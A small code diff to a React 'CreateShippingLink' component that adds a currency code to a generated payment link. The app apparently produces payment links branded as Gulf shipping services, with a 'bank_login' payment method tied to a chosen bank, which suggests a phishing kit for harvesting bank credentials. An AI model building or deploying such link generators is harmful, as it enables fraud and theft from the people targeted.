@@ -10,7 +10,7 @@ import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBanksByCountry } from "@/lib/banks";
-import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
+import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
 import { generatePaymentLink } from "@/utils/paymentLinks";
@@ -85,6 +85,7 @@ const CreateShippingLink = () => {
           payer_type: payerType, // "recipient" or "sender"
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 500,
+          currency_code: getCurrencyCode(country || "SA"),
           payment_method: paymentMethod,
           selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
           selectedCountry: country || "SA",
